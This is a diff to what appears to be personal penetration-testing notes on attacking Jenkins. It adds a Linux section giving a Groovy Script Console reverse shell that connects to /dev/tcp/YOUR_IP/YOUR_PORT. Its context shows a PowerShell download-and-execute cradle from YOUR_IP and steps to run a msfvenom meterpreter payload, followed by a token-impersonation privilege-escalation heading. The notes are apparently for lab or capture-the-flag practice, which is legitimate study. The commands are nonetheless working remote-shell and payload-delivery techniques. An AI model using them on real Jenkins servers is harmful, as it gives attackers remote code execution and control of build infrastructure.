@@ -5,6 +5,8 @@ title: Jenkins 👨‍🎓
 
 ## Gaining a reverse shell
 
+### For Windows
+
 1. Go to `Jenkins >> New Item`
 2. Create a new `Freestyle project`
 3. Go to `Build section` and select `Execute Windows batch command`:
@@ -26,7 +28,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://YOUR_IP:PYTHON_
 
 ![](Pasted%20image%2020240512182102.png)
 
-### Switch to a meterpreter
+#### Switch to a meterpreter
 
 1. Generate a Windows meterpreter reverse shell using [Msfvenom 🕸️](/notes/Tools/msfvenom.md) (*check the command in the note*)
 2. After creating the payload, download it into the machine with:
@@ -52,7 +54,23 @@ run
 Start-Process SHELL.exe
 ```
 
-### Privilege Escalation with Token Impersonation
+## For Linux
+
+Go to `Jenkins` >> `Manage Jenkins` and click on `Script Console`
+
+![](Pasted%20image%2020240531163514.png)
+
+Now execute the following command:
+
+```shell
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/YOUR_IP/YOUR_PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+![](Pasted%20image%2020240531163709.png)
+
+## Privilege Escalation with Token Impersonation
 
 Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).
 
